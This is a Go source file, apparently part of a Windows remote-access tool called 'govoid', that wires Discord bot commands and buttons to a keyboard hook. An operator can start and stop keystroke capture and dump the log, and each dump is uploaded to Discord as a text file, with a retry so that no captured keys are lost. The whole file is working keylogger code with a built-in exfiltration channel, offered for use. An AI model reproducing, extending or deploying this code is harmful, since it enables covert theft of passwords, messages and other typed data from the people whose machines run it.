//go:build windows

package commands

import (
	"bytes"
	"fmt"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/win32"
)

// Keylog controla el hook de teclado: start, stop o dump.
func Keylog(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}

	switch StringOption(i, "action") {
	case "start":
		if err := win32.Default.Start(); err != nil {
			Finish(s, i, "❌ "+err.Error())
			return
		}
		Finish(s, i, "🔑 Keylogger iniciado.")

	case "stop":
		if !win32.Default.Running() {
			Finish(s, i, "ℹ️ El keylogger no está corriendo.")
			return
		}
		win32.Default.Stop()
		Finish(s, i, "🛑 Keylogger detenido.")

	case "dump":
		sendKeylogDump(s, i)

	default:
		Finish(s, i, "❌ Acción inválida. Usa start, stop o dump.")
	}
}

// KeylogDump atiende el botón del panel: envía el buffer actual.
func KeylogDump(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}
	sendKeylogDump(s, i)
}

// KeylogStart atiende el botón ▶️ del panel.
func KeylogStart(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}
	if err := win32.Default.Start(); err != nil {
		Finish(s, i, "❌ "+err.Error())
		return
	}
	Finish(s, i, "🔑 Keylogger iniciado.")
}

// KeylogStop atiende el botón ⏹ del panel.
func KeylogStop(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}
	if !win32.Default.Running() {
		Finish(s, i, "ℹ️ El keylogger no está corriendo.")
		return
	}
	win32.Default.Stop()
	Finish(s, i, "🛑 Keylogger detenido.")
}

func sendKeylogDump(s *discordgo.Session, i *discordgo.InteractionCreate) {
	data, offset := win32.Default.Dump()
	if data == "" {
		Finish(s, i, "ℹ️ Keylog vacío — el hook está activo y no hay teclas nuevas desde el último dump.")
		return
	}
	content := fmt.Sprintf("🔑 Keylog dump — %d bytes", len(data))
	file := &discordgo.File{
		Name:        fmt.Sprintf("keylog_%d.txt", time.Now().Unix()),
		ContentType: "text/plain",
		Reader:      bytes.NewBufferString(data),
	}
	if _, err := s.InteractionResponseEdit(i.Interaction, &discordgo.WebhookEdit{
		Content: &content,
		Files:   []*discordgo.File{file},
	}); err != nil {
		Finish(s, i, "❌ No se pudo subir el dump: "+err.Error())
		return
	}
	// El puntero solo avanza cuando el archivo salió: si Discord falla, el
	// mismo texto se reintenta en el siguiente dump en vez de perderse.
	win32.Default.Commit(offset)
}
